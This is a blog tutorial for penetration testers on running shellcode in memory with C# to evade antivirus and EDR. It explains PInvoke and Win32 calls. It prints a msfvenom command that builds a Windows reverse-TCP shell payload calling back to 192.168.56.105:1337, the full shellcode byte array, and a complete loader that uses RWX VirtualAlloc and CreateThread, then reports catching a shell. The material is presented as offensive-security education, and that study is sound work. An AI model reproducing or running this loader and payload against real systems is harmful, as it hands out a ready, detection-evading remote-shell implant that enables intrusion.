---
title: "Introduction to C# for penetration testers: Section 1 Running stuff in memory, Part 1 Shellcode"
excerpt: "Post introducing C# usage, intended for penetration testers. Explaining basic concepts and showing how to run Shellcode in memory via C#"
last_modified_at: 2018-01-03T09:45:06-05:00
header:
  teaser: "assets/images/markup-syntax-highlighting-teaser.jpg"
tags: 
  - c#
  - NET
  - shellcode
toc: false
classes: wide
layout: single
---

This is the first of a blog series on using C# for offensive security, with a particular focus for penetration testers.
For the first topic, I will focus on possibly the most useful task for penetration testers, AV/EDR bypassing other‚Äôs tools and scripts.
### Why?
So many amazing tools and exploits are constantly being developed (and have existed for a long time) that we as pentesters, can and do use on a daily basis. Re-developing these tools from scratch will take time and effort that is simply not feasible.
Because of this, being able to take other‚Äôs tools, and develop custom AV/EDR bypass methods can allow a pentester to quickly whip up a version of a tool that does not get caught by AV, and can be executed in the event an application whitelist is bypassed (looking at you MSBuild).
### Ok, but why C#?
C# is a high level language, this makes it very quick and relatively easy to develop and modify. It is built using the powerful .NET Common Language Runtime (CLR) giving access to both the native and Win32 API‚Äôs. This gives C# the ability to perform very useful tasks, such as running shellcode in memory, running Portable Executable‚Äôs, token manipulation just to name a few. This means, as a penetration tester, C# is a language that can be relatively easily written, modified and deployed during engagements, requiring hours instead of days to develop.
### C# vs .Net vs CLR vs ‚Ä¶
Often .Net and C# are used interchangeably but this is not true. C# is a programming language that uses the .NET Framework, which is run within the Common Language Runtime. The code that runs in the Common Language Runtime is called Microsoft Intermediate Language (MSIL). It is the CLR‚Äôs responsibility to convert this Intermediate Language into native code (via the Just In Time (JIT) compler) that in turn is actually run by the Operating System.<br/><br/>
Multiple programming languages exist that use the .NET Framework and CLR, including VB.NET, a variation of C++ (C++ .NET), Iron Python and PowerShell. Whilst not entirely true, this is a similar concept to Java being converted to byte code, that is in turn run on the Java Virtual Machine (JVM).<br/><br/>
The image below gives a visual diagram of the differences.
{% include figure image_path="/assets/img/clrexecutionmodel.jpg" alt="CLR Execution Model" caption="CLR Execution Model - Reference: https://stackoverflow.com/questions/4184162/what-is-the-difference-between-clr-and-dlr-in-c" %}
What this means, is that when we run a C# developed program (a .NET assembly, sometimes called managed code) we are restricted in what we can and cannot do by the capabilities provided to us by the CLR we run within, this becomes important when discussing AV/EDR bypassing.
### Running stuff in memory
The first important concept to cover is the concept of running stuff in memory. Long go the times where you can simply drop some msfconsole generated executeable on disk and not expect every single Anti-Virus in existence to nuke it off the face of the Earth. So for us this means we can‚Äôt directly drop generated exe‚Äôs/payload files to disk, as this will immediately (well should) get flagged and be useless to us.<br/><br/>
In comes the concept of running payloads in memory. This allows us to hopefully defeat static analysis performed by Anti-Virus by finding tricky ways to encrypt and run payloads dynamically, significantly reducing the chances of our payloads getting caught.<br/><br/>
### Running shellcode in memory via Win32 API's
The first thing we will run in memory is shellcode. If you don‚Äôt know, shellcode can be generally thought of as ‚Äúmalicious‚Äù native code, that is pure native code that if directly run will do some bad thing. At first this code would provide shell, hence the term shellcode, but can now mean much more.<br/><br/>
Running shellcode in memory is a very well studied and known topic. For this we will only be discussing ‚Äúself‚Äù injection methods, that is running shellcode within the same process, i.e. ours. In general the steps to executing Position Independent shellcode does:
1.	Allocate memory for the shellcode (usually with Write/Execute permissions).
2.	Write shellcode to newly allocated memory.
3.	Execute the shellcode
4.	Profit üòä<br/><br/>

So how do we actually do this in C#? To do this we will use the Win32, native API‚Äôs and/or built in .NET functionality. The Win32 API is an API written in C and developed by Microsoft to be used by developers of Windows applications to interact with the Windows Operating System. This allows applications running in user mode  to do actions such as list files in directories, obtain handles to access tokens, allocate memory ect.<br/><br/>
The native API‚Äôs are an API written in C and developed by Microsoft, but it is not intended to be used by developers. These API‚Äôs are responsible of switching from user to kernel mode and actually running syscalls. They are not officially documented (unlike the Win32 API), but are called by the Win32 API. You can think of the Win32 API as the one that was made to do validation checks and be easier to use then the native API. Whilst the native API is responsible for performing the actions on the kernel side of things. Most of the time we will be using the Win32 API. <a href="https://yuval0x92.wordpress.com/">@YUVAL0X92</a> has  good blog showing the difference's between the two <a href="https://yuval0x92.wordpress.com/2020/03/09/native-api-win32-api/">here</a>. <br/><br/>
But C# runs within the CLR, and the Win32 API compiled C code (i.e. unmanaged code) in the format of a Dynamic Linked Library (DLL), so how do we run functions defined in the Win32 API? Luckily the CLR has an API that can be leveraged to perform such a task, called Platform Invoke (shortened to PInvoke).<br/><br/>
This is an API that allows managed code to provide a location to a unmanaged library and function definition (termed prototype) containing its name, input parameters and return type. A lot of C data types do not directly exist in C#/.NET, and a part of PInvoke‚Äôs job is to handle the translation between the C# data type, and the actual data type required for the Win32 API call. 
How do we actually use this? First we need to include the namespace (can be thought of as a ‚Äúpackage‚Äù) that contains the PInvoke API (System.Runtime.InteropServices), add the DLLImport keyword and the function prototype (with the C data types written in the .NET equivalent).<br/><br/>
But how do we know what data types correspond to what data types in .NET? There‚Äôs no official documentation, but the site <a href="https://www.pinvoke.net">pinvoke.net</a> has a collection of common Win32 API‚Äôs function prototype‚Äôs for use in C#, so this is a great resource if you get stuck.


### POC Code
OK, so enough talking, time for some code. <br/><br/>
For the first example, we will use the VirtualAlloc Win32 API for the allocation of memory, Marshal.Copy .NET method for writing to this allocated memory, and CreateThread Win32 API to make a new thread that in turn will execute the memory we have allocated.<br/><br/>
Firstly we will create some shellcode using msfvenom:

{% highlight csharp %}
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.105 LPORT=1337 -f csharp -v shellCode                                                                                                                                                                                                                   130 ‚®Ø
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of csharp file: 2368 bytes
byte[] shellCode = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x05,0x39,0xc0,0xa8,0x38,0x69,0x41,0x54,
0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
{% endhighlight %}

This is then used within a C Sharp file that executes the shellcode.
{% highlight csharp linenos %}
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ShellCodeRunner {

    public class Program {
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags,  IntPtr lpThreadId);
        
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        static void Main(string[] args)
        {
           byte[] shellCode = new byte[460] {
              0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
              0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
              0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
              0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
              0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
              0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
              0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
              0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
              0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
              0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
              0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
              0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
              0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
              0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
              0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
              0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x05,0x39,0xc0,0xa8,0x38,0x69,0x41,0x54,
              0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
              0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
              0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
              0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
              0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
              0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
              0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
              0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
              0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
              0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
              0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
              0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
              0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
              0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
              0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };

            IntPtr rwxMemory = VirtualAlloc(IntPtr.Zero, (uint)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellCode, 0, rwxMemory, shellCode.Length);
            IntPtr shellCodeThread = CreateThread(IntPtr.Zero, 0, rwxMemory, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(shellCodeThread, 0xFFFFFFFF);

        }
    }
}

{% endhighlight %}
You can use either Visual Studio or csc.exe to compile the file. Assuming its saved at Program.cs, run the following to compile it to Program.exe:
{% highlight shell %}
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Program.cs
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
{% endhighlight %}
Then when run with msfconsole set up, a shell is caught :)
{% include figure image_path="/assets/img/runningProgram.png" alt="" caption="" %}
{% include figure image_path="/assets/img/catchingshell.png" alt="" caption="" %}

### What is this?
We first start by importing the Win 32 API functions we want by using the DllImport keyword, a part of the PInvke to import certain functions from specific DLL‚Äôs. Specifically on line x, we say from the kernel32.dll, import the function with the name CreateThread that will return a pointer to an int, that takes an int pointer, unsigned 32 bit int, int pointer, int pointer, unsigned 32 bit int and another int pointer as arguments.
If we look at the official documentation for the prototype for CreateThread we will see that this isn‚Äôt exactly the same:
{% highlight c %}
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
{% endhighlight %}
As you can see, the data types from the official prototype are different to the one we are using. This is in part the magic that PInvoke performs. We use pinvoke.net to find the actual prototype we need to use <a href="http://www.pinvoke.net/default.aspx/kernel32/CreateThread.html">here</a>. 
We repeat this import/translation process for WaitForSingleObject and VirtualAlloc Win32 API‚Äôs.<br/><br/>
Within the program‚Äôs main method, we start by declaring a byte array that contains our shellcode we want to execute (coming from msfvenom).<br/><br/>
Next we allocate RWX (Read, Write, Execute) process memory by using the VirtualAlloc Win32 API call (line 57). The first argument to this call is what start address do we want for the memory, in our case we don‚Äôt care so we pass it a zero pointer. Next argument we specify how much memory we want to allocate (VirtualAlloc works with page's) saying we want at least the size of the shellcode allocated. We say we want the memory to be commited (the third argument), meaning we want to actually allocate and map this memory physically (as apposed to "reserving" a particular virtual memory address). This argument is a DWORD flag, where the values can be found <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">here</a>. We set a variable called MEM_COMMIT with this value as an unsigned integer on line 20. Similarly we specify the memory protection of the requested memory to be PAGE_EXECUTE_READWRITE (0x40) using the common memory protection constants located <a href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">here</a>. This specifies the memory can be read, written to and executed from. The return of this call will be the memory address pointer (IntPtr) of the newly allocated memory. <br/><br/> 
On line 59 we use the .NET Marshal.Copy method (located within the using System.Runtime.InteropServices) namespace. Marshal has a bunch of useful methods as part of the Reflection API to help convert from managed to unmanaged code. This method copies memory from a managed array to an unmanaged section of memory (i.e. the type we allocated). Here we copy the shellCode byte array (first argument), starting at the first index of the area (0) (second argument), specifying the destination address (the newly allocated address) and the amount of data to copy (being the length of the shellCode array).<br/><br/>
Next on line 60 we use the Win32 API CreateThread to create a new thread to run the shellcode. The first argument specifies a pointer to a SECURITY_ATTRIBUTES structure which states if a child process can inherit (use) the returned handle to the new thread. We don't really care, so for simplicity we pass it "NULL" which is an IntPtr.Zero object. The second argument specifies the size of the stack to use, we again don't care and just want it to use the default set for this executeable (hence we pass 0). The third argument is the start memory address of the code we want this thread to run. In this case we want it to run the shellcode written in the RWX memory, so we pass that as this parameter. THe next argument is the parameters to pass along to the code to be run. We aren't passing parameters so we again pass it "NULL" being IntPtr.Zero. We specify the creation flag to be "0", which indiciates to immediately run this thread after its created (the other flags can be found <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">here</a>). The final argument is a pointer to the thread ID we want to use. We don't care, so again we pass NULL (IntPtr.Zero) as this argument.<br/><br/> 
When this line is run, we obtain a handle to a newly created thread, and the thread starts running our shellcode. However this isn't a blocking call, that is the program by default won't wait for the thread to finish, and instead will simply terminate the process (including this thread) almost immediately.<br/><br/>
To stop this we use the Win32 API WaitForSingleObject is used to make this calling process wait for the thread to "signal" (enter a signable state), effectively halting execution (and therefore termination) until the thread alerts the process (i.e. it terminates). The first argument to this function is a handle to the object this process should "wait" for, in our case we want the newly created thread running our shellcode, so we pass the return value from CreateThread. The second argument is the amount of milliseconds to wait for (after which this process will continue anyway), since we don't want this to terminate, we pass the maximum amount of milliseconds possible (0xFFFFFFFF).
### GitHub link

All of the above techniques have been combined into one POC on my GitHub, located <a href="https://github.com/ret2desync/SharpShellCodeExecutor"> here</a>